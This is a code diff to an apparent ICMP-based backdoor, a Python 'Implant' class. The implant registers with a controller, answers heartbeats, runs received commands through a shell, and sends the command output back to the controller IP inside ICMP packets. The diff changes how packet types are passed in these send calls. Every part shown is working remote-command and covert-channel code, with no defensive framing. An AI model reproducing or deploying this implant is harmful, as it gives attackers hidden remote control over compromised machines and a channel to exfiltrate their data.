@@ -46,7 +46,7 @@ class Implant(Host):
         Passes the working directory along with the join command
         """
 
-        self.send(shellpack['ip'], "join", os.getcwd().encode(), type="req")
+        self.send(shellpack['ip'], "join", os.getcwd().encode(), icmp_type=0)
 
     def heartbeat_response(self, shellpack: dict) -> None:
         """
@@ -56,7 +56,7 @@ class Implant(Host):
         """
 
         if shellpack['data'] == self.id:
-            self.send(self.controller_ip, "heartbeat", self.id, type="resp")
+            self.send(self.controller_ip, "heartbeat", self.id, type="resp", icmp_type=0)
 
     def run_module(self, shellpack: dict) -> None:
         """
@@ -105,18 +105,18 @@ class Implant(Host):
 
         try:
             output = check_output(cmd, stderr=STDOUT, timeout=3, shell=True)
-            self.send(self.controller_ip, "instruction", output, type="resp")
+            self.send(self.controller_ip, "instruction", output, icmp_type=0)
         except TimeoutExpired:
-            self.send(self.controller_ip, "instruction", b'The command has timed out', option="ERROR", type="resp")
+            self.send(self.controller_ip, "instruction", b'The command has timed out', option="ERROR", icmp_type=0)
         except Exception:
-            self.send(self.controller_ip, "instruction", b'There was an error with the command', option="ERROR", type="resp")
+            self.send(self.controller_ip, "instruction", b'There was an error with the command', option="ERROR", icmp_type=0)
 
 def main():
     # Defines the implant with the controller IP
     implant = Implant(controller_ip=controller_ip)
 
     # Send join command to the daemon
-    implant.send(implant.controller_ip, "join", os.getcwd().encode(), type="req")
+    implant.send(implant.controller_ip, "join", os.getcwd().encode())
 
     # Start sniffing
     sniff(iface=implant.iface, prn=implant.sniff_callback, filter="icmp", store="0")
